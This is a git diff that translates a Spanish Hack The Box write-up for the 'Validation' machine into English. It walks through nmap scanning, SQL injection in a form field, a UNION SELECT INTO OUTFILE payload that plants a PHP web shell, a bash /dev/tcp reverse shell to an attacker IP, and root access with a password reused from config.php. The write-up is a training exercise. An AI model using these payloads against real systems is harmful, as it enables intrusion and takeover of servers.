@@ -1,5 +1,5 @@
 ---
-title:  "Writeup de la máquina Validation de Hack The Box"
+title:  "Writeup Validation machine of Hack The Box"
 date: 2023-04-16
 mathjax: true
 layout: post
@@ -7,55 +7,55 @@ categories: writeup
 tags: sql-injection burpsuite php web-shell
 ---
 
-# Resolución de la máquina Validation de la plataforma de HackTheBox
+# Resolution of Validation machine of Hack The Box
 
 ![](https://i.ibb.co/SdzyZRf/validation.png)
 
-### 💉 *"Máquina vulenrable a SQL Injection !!"*
+### 💉 *"Machine vulnerable to SQL Injection !!"*
 
-**Como siempre, primero revisamos que tenemos conexión con la máquina víctima, desde nuestra máquina atacante. Una forma de hacerlo es a través del envío de paquetes ICMP con el comando "ping"**:
+**As always, we first check that we have a connection to the victim machine, from our attacking machine. One way to do this is by sending ICMP packets with the "ping" command:**
 
 ```bash
 ping -c 1 10.10.11.116
 ```
 
-**Ahora sabemos que tenemos conexión con la máquina ya que nos respondió con los paquetes que recibimos**
+**We now know that we have a connection to the machine since it responded with the packets we received**.
 
 ![](https://i.ibb.co/tMw3TDP/ping.png)
 
-**Primeramente hacemos un escaneo Activo de la máquina en búsqueda de puertos abiertos con el siguiente comando:**
+First we do an Active scan of the machine in search of open ports with the following command
 
 ```bash
 sudo nmap 10.10.11.116 -p- --min-rate 5000 -sS -Pn -oG openPorts -vvv 
 ```
 
-Con el comando anterior exportamos el resultado en un formato en el cual podamos extraer los puertos abiertos con la ayuda de comandos como *"grep, awk y otros más"* para luego escanear en profundidad:
+With the above command we export the result in a format in which we can extract the open ports with the help of commands such as *"grep, awk and others "* and then scan in depth:
 
 ```bash
 sudo nmap 10.10.11.116 -p22,80,4566,8080 -sV -sC -sS -Pn -oN scanComplete -vvv
 ```
 
-#### Ahora con el escaneo completo obtenemos el siguiente resultado:
+#### Now with the complete scan we obtain the following result:
 
 ![](https://i.ibb.co/HX2nbYG/nmap.png)
 
-**Como está abierto el puerto 80 corriendo el servicio http, entramos en el navegador web en la dirección IP de la máquina por ese puerto:**
+As port 80 is open running the http service, we enter in the web browser the IP address of the machine through that port:
 
-*Pero antes de seguir con el pentesting de esta máquina, agregamos como host "validation.htb" con la IP de la máquina (10.10.11.116)*
+*But before continuing with the pentesting of this machine, we add as host "validation.htb" with the IP of the machine (10.10.11.116)*.
 
 ![](https://i.ibb.co/ZMB5KXJ/etc-hosts.png)
 
-**Vemos que tenemos un formulario simple, escrito en HTML con un input que nos permite elegir nuestro "Username", además de la región, que viene por defecto "Brazil". Si inspeccionamos el código fuente podemos ver que el <form> es decir, el formulario, envía los valores del "Username" y la "Región" al servidor web. Con esto podemos pensar que estos valores se alojan en una Base de Datos:**
+**We see that we have a simple form, written in HTML with an input that allows us to choose our "Username" as well as the region, which defaults to "Brazil". If we inspect the source code we can see that the <form> i.e. the form, sends the values of the "Username" and the "Region" to the web server. With this we can think that these values are hosted in a Database:**.
 
 ![](https://i.ibb.co/nBv2wxC/form-html.png)
 
 ## Burp Suite
 
-**Ahora configuramos la extensión de FoxyProxy en Firefox para redirigir la solicitud (o Request) a través de nuestro localhost por el puerto 8080 (127.0.0.1:8080). De este modo lo interceptamos con Burp Suite y desde ahí seguir:**
+**Now we configure the FoxyProxy extension in Firefox to redirect the request through our localhost on port 8080 (127.0.0.1:8080). This way we intercept it with Burp Suite and from there follow:**
 
 ![](https://i.ibb.co/rdCRMvK/burp-suite.png)
 
-**Ahora desde Burp Suite, comentamos el valor de el campo "country" y le inyectamos el código:**
+**Now from Burp Suite, we comment the value of the “country” field and inject the code:**
 
 ```
 or 1=1
@@ -63,31 +63,31 @@ or 1=1
 
 ![](https://i.ibb.co/h1gK15v/sqli-nourl.png)
 
-Luego lo encodeamos con codificación URL:
+Then we encode it with URL encoding:
 
 ![](https://i.ibb.co/crrD0TR/sqli-url.png)
 
-**Ahora si regresamos a la parte web, vemos que se filtra el Error del Backend, lo cual nos hace pensar que es vulnerable a SQL Injection:**
+Now if we go back to the web part, we see that the Backend Error is leaked, which makes us think that it is vulnerable to SQL Injection:
 
 ![](https://i.ibb.co/xFDK3xZ/sqli-vulnerable.png)
 
-## Una vez encontrada la vulnerabilidad, pasamos a crear un Backdoor
+## Once the vulnerability has been found, we create a Backdoor.
 
-Como vemos en el sitio, la aplicación web utiliza PHP. Podemos intentar inyectarle una web-shell en PHP a través de un ataque de SQL Injection:
+As we can see on the site, the web application uses PHP. We can try to inject a web-shell in PHP through a SQL Injection attack:
 
-*El código que vamos a usar para agregar una web-shell con una SQL Injection será:*
+*The code we are going to use to add a web-shell with an SQL Injection will be:*
 
 ```sql
 ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
 ```
 
-*Con el código anterior le decimos al servidor que también seleccione esa fracción de código, (que es el Backdoor), y lo inserte en el archivo /var/www/html/shell.php. Es decir que shell.php será nuestra web-shell en PHP. También es bueno saber que normalmente los servidores web que se ejecutan en Linux (estos son la mayoría actualmente, aunque no todos), tienen como raíz de directorios web la ruta /var/www/html*
+*With the previous code we tell the server to also select that fraction of code, (which is the Backdoor), and insert it in the file /var/www/html/shell.php. That is to say that shell.php will be our web-shell in PHP. It is also good to know that normally the web servers that are executed in Linux (these are the majority at the moment, although not all), have as root of web directories the route /var/www/html*.
 
 ![](https://i.ibb.co/M8HJL2d/backdoor.png)
 
-## Ahora probamos y ¡Funciona!
+## Works!!
 
-**Tenemos lista nuestra web-shell en la ruta /shell.php, ahora para ejecutar un comando en el servidor solamente hay que añadir la siguiente query (consulta):**
+We have our web-shell ready in the path /shell.php, now to execute a command in the server we only have to add the following query:
 
 ```
 shell.php?cmd={comando}
@@ -95,33 +95,33 @@ shell.php?cmd={comando}
 
 ![](https://i.ibb.co/3Nc8csP/web-shell.png)
 
-Ahora vamos a [https://www.revshells.com/](https://www.revshells.com/) y generamos un payload para ejecutar una Shell Reversa con Netcat y poder conectarnos al servidor desde una consola interactiva. El mismo lo ejecutamos como comando en el Backdoor de "shell.php".
+Now we go to [https://www.revshells.com/](https://www.revshells.com/) and generate a payload to execute a Reverse Shell with Netcat and to be able to connect to the server from an interactive console. We execute it as a command in the Backdoor of "shell.php".
 
-Luego de probar con varios tipos de shells, me funcionó agregarle:
+After trying several types of shells, it worked for me to add it:
 
 ```bash
 bash -c '{payload de la shell}'
 ```
 
-Lo cual quedaría así:
+Which would look like this:
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.2/4545 0>&1'
 ```
 
-Lo encodeamos como URL y ejecutamos el código en la web-shell, desde el navegador o desde Burp Suite.
+We encode it as a URL and execute the code in the web-shell, from the browser or from Burp Suite.
 
-**Vemos en el archivo "config.php" una contraseña.**
+**We see in the "config.php" file a password **.
 
 ![](https://i.ibb.co/hZfGLGh/config-php.png)
 
-**Como somos Pentesters, tenemos que probar todas las formas en que se podría acceder de forma privilegiada al sistema, así que intentamos usar esa contraseña para autenticarnos como usuario root:**
+**As we are Pentesters, we have to test all the ways in which the system could be accessed in a privileged way, so we try to use that password to authenticate as root user:** 
 
-## ¡YES! Al parecer la contraseña de root es esa.
+## YES! It seems that this is the root password.
 
 ![](https://i.ibb.co/NsT0Z4n/flag-root.png)
 
-### Y con esto terminamos la máquina y tenemos acceso total al sistema.
+### And with this we finish the machine and we have full access to the system.
 
 Happy Hacking!!
 
